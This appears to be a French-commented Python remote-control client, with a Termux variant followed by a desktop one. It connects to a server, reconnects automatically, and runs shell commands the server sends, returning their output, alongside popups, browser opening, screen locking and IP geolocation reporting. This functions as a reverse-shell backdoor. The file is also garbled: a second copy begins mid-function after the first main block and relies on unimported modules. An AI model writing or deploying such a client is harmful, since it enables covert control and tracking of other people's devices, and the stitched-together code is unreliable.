import subprocess
import webbrowser
import requests
import os
import socket as sock
import sys
import time
import platform
import threading

# --- CONFIGURATION ---
HOST = '127.0.0.1'  # Adresse IP du serveur
PORT = 65432        # Port de connexion
BUFFER_SIZE = 4096  # Taille du buffer réseau

def get_local_ip():
    """Récupère l'adresse IP locale de la machine."""
    s = sock.socket(sock.AF_INET, sock.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = "127.0.0.1"
    finally:
        s.close()
    return local_ip

def show_popup(message):
    """Affiche un message dans le terminal (Termux n'a pas de GUI)."""
    print(f"\n[POPUP] {message}\n")
    return "Message affiche dans le terminal"

def open_browser(url):
    """Ouvre une URL dans le navigateur par défaut."""
    try:
        webbrowser.open(url)
        return "Navigateur ouvert"
    except Exception as e:
        return f"Erreur navigateur: {str(e)}"

def get_location():
    """Récupère la localisation via ipinfo.io."""
    try:
        r = requests.get('https://ipinfo.io/json', timeout=5).text
        return r
    except Exception:
        return "Erreur localisation"

def run_command(cmd):
    """Exécute une commande shell et retourne la sortie."""
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return out.decode('utf-8', errors='ignore') if out else "OK"
    except Exception as e:
        return str(e)

def main():
    """Fonction principale du client Termux."""
    print(f"[*] Client Termux actif. Connexion vers {HOST}:{PORT}...")

    while True:  # Boucle de reconnexion automatique
        try:
            with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                s.sendall(f"Connecte: {platform.system()} ({get_local_ip()})".encode('utf-8'))

                while True:
                    command = s.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
                    if not command:
                        break

                    print(f"[RECU] Commande : {command}")

                    if command.startswith("popup:"):
                        threading.Thread(target=show_popup, args=(command[6:],)).start()
                        s.sendall("OK: Popup affichee".encode('utf-8'))

                    elif command.startswith("browser:"):
                        webbrowser.open(command[8:])
                        s.sendall("OK: Navigateur ouvert".encode('utf-8'))

                    elif command == "location":
                        try:
                            r = requests.get('https://ipinfo.io/json', timeout=5).text
                            s.sendall(r.encode('utf-8'))
                        except Exception:
                            s.sendall("Erreur localisation".encode('utf-8'))

                    elif command.startswith("cmd:"):
                        try:
                            out = subprocess.check_output(command[4:], shell=True, stderr=subprocess.STDOUT)
                            s.sendall(out if out else b"OK")
                        except Exception as e:
                            s.sendall(str(e).encode('utf-8'))

                    elif command == "lock":
                        s.sendall("Fonctionnalite desactivee (Termux)".encode('utf-8'))

                    elif command.startswith("speak:"):
                        s.sendall("Fonctionnalite desactivee (Termux)".encode('utf-8'))

                    elif command == "screenshot":
                        s.sendall("Fonctionnalite desactivee (Termux)".encode('utf-8'))

                    elif command == "exit":
                        print("[INFO] Deconnexion demandee.")
                        return

        except ConnectionRefusedError:
            print("[ERREUR] Impossible de se connecter au serveur. Reessai dans 5 secondes...")
        except Exception as e:
            print(f"[ERREUR] {str(e)}")
        time.sleep(5)

if __name__ == "__main__":
    main()
            try:
                subprocess.run(['notify-send', 'Message', message], check=True)
            except subprocess.CalledProcessError:
                subprocess.run(['zenity', '--info', '--text', message], check=True)
        return "Pop-up affichée"
    except Exception as e:
        return f"Erreur popup: {str(e)}"

def lock_session():
    """Verrouille la session utilisateur selon le système d'exploitation."""
    system = platform.system()
    try:
        if system == "Windows":
            ctypes.windll.user32.LockWorkStation()
        else:
            os.system("xdg-screensaver lock")
        return "Session verrouillée"
    except Exception as e:
        return f"Erreur verrouillage: {str(e)}"

def speak(text):
    """Synthétise vocalement le texte donné."""
    try:
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        return "Message vocalisé"
    except Exception as e:
        return f"Erreur voix: {str(e)}"

def main():
    """Fonction principale du client."""
    print(f"[*] Client actif sur {platform.system()}. Connexion vers {HOST}:{PORT}...")

    while True:  # Boucle de reconnexion automatique
        try:
            with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                s.sendall(f"Connecté: {platform.system()} ({get_local_ip()})".encode())

                while True:
                    command = s.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
                    if not command:
                        break

                    print(f"[RECU] Commande : {command}")

                    if command.startswith("popup:"):
                        threading.Thread(target=show_popup, args=(command[6:],)).start()
                        s.sendall(b"OK: Popup affichée")

                    elif command.startswith("browser:"):
                        webbrowser.open(command[8:])
                        s.sendall(b"OK: Navigateur ouvert")

                    elif command == "location":
                        try:
                            r = requests.get('https://ipinfo.io/json', timeout=5).text
                            s.sendall(r.encode())
                        except Exception:
                            s.sendall(b"Erreur localisation")

                    elif command.startswith("cmd:"):
                        try:
                            out = subprocess.check_output(command[4:], shell=True, stderr=subprocess.STDOUT)
                            s.sendall(out if out else b"OK")
                        except Exception as e:
                            s.sendall(str(e).encode())

                    elif command == "lock":
                        s.sendall(lock_session().encode())

                    elif command.startswith("speak:"):
                        threading.Thread(target=speak, args=(command[6:],)).start()
                        s.sendall(b"OK: Message vocalisé")

                    elif command == "screenshot":
                        s.sendall(b"Fonctionnalité désactivée")

                    elif command == "exit":
                        print("[INFO] Déconnexion demandée.")
                        return

        except ConnectionRefusedError:
            print("[ERREUR] Impossible de se connecter au serveur. Réessai dans 5 secondes...")
        except Exception as e:
            print(f"[ERREUR] {str(e)}")
        time.sleep(5)

if __name__ == "__main__":
    main()
